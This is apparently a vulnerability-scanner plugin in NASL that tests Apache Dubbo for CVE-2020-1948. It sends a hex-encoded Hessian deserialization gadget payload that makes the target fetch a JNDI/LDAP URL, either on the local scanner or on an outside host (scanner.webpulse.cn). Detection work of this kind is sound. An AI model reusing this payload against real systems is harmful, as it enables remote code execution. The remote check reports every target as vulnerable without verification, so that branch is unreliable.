include("compat.inc");


if (description)
{
  script_id(51799262);
  script_version("1.3");
  script_name(english:"Apache Dubbo Provider RCE (CVE-2020-1948)");
  script_summary(english:"Apache Dubbo Provider RCE (CVE-2020-1948)");
  script_set_attribute(attribute:"description", value:"Apache Dubbo is a high-performance Java RPC framework. The vulnerability exists in the hessian, the deserialization tool used by Apache Dubbo by default. An attacker may trigger a vulnerability by sending a malicious RPC request, which usually carries an unrecognized service name or method name, as well as some malicious Parameter load. When the malicious parameters are deserialized, the purpose of code execution is achieved.");
  script_set_attribute(attribute:"solution", value:"At present, the manufacturer has released an upgrade patch to fix the vulnerability, and the patch acquisition link:https://github.com/apache/dubbo/releases/tag/dubbo-2.7.7");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports(20880);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("network_func.inc");
include("install_func.inc");
include("dump.inc");

############################################################
function check_local_ping(port){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	
	var bind_result = bind_sock_tcp();
	if (isnull(bind_result))audit(AUDIT_SOCK_FAIL, port);
	var bind_sock = bind_result[0];
	var bind_port = bind_result[1];

    i = 0;
	argv[i++] = "iptables";        
	argv[i++] = "-I";
	argv[i++] = "INPUT";
	argv[i++] = "-p";
	argv[i++] = "tcp";
	argv[i++] = "--dport";
	argv[i++] = bind_port;
	argv[i++] = "-j";
	argv[i++] = "ACCEPT";
	#pread(cmd: "iptables", argv: argv, nice: 5);

	laddress = compat::this_host();
	ladp = "ldap://"+laddress +':'+ bind_port+"/";
	ladp_exp = "ldap://"+laddress +':'+ bind_port+"/Exploit";
	
	payload = hex2raw(s:"dabbc2000000000000000001000001");
	payload += raw_string(strlen(ladp));
	payload += hex2raw(s:"05322e352e3306636e2e72617903312e3003726365302b4c636f6d2f726f6d65746f6f6c732f726f6d652f666565642f696d706c2f546f537472696e674265616e3b433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c920a64617461536f757263650f7374724d61746368436f6c756d6e736230");
	payload += raw_string(strlen(ladp_exp))  + raw_string(ladp_exp);
	payload += hex2raw(s:"7903666f6f485a");
	
	# send payload
	send(socket:soc, data:payload);

	var accept_sock = sock_accept(socket:bind_sock, timeout:10);
	j = 0;
	argv[j++] = "iptables";        
	argv[j++] = "-D";
	argv[j++] = "INPUT";
	argv[j++] = "-p";
	argv[j++] = "tcp";
	argv[j++] = "--dport";
	argv[j++] = bind_port;
	argv[j++] = "-j";
	argv[j++] = "ACCEPT";
    #pread(cmd: "iptables", argv: argv, nice: 5);
    if(!accept_sock) exit(0);
	var curl_response = recv(socket:accept_sock, length:15);
    if ("300c020101600702010304008000" == hexstr(curl_response) && strlen(curl_response) == 14){
	    return {'vuln':true, 'report':hexdump(ddata:payload)};
	}
	close(soc);

}


function check_remote(port){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	
	laddress = compat::this_host();
	pattern = hexstr(rand_str(length:6));
	ladp = "ldap://"+pattern +".scanner.webpulse.cn/";
	
	payload = hex2raw(s:"dabbc200000000000000000100000123");
	payload += hex2raw(s:"05322e352e3306636e2e72617905312e302e3003726365302b4c636f6d2f726f6d65746f6f6c732f726f6d652f666565642f696d706c2f546f537472696e674265616e3b433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c920a64617461536f757263650f7374724d61746368436f6c756d6e736230");
	payload += raw_string(strlen(ladp))  + raw_string(ladp);
	payload += hex2raw(s:"7903666f6f485a");
	
	# send payload
	send(socket:soc, data:payload);
	sleep(1);
	
	report = "[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
	return {'vuln':true, 'report':report};
	close(soc);

}

####################
#begin here
####################
port = 20880;
if(!get_port_state(port)) exit(0);
ipaddr = get_host_ip(ipaddr);

#if(is_private_addr()) {
if(0) {
	default_port= 20880;

	result_default = check_local_ping(port:default_port);
	if (result_default['vuln']){
		security_hole(port:port, extra:result_default['report']);
		exit(0);
	}
}
else{
	result_remote = check_remote(port:port);
	if (result_remote['vuln']){
		security_hole(port:port, extra:result_remote['report']);
		exit(0);
	}

}
exit(0);
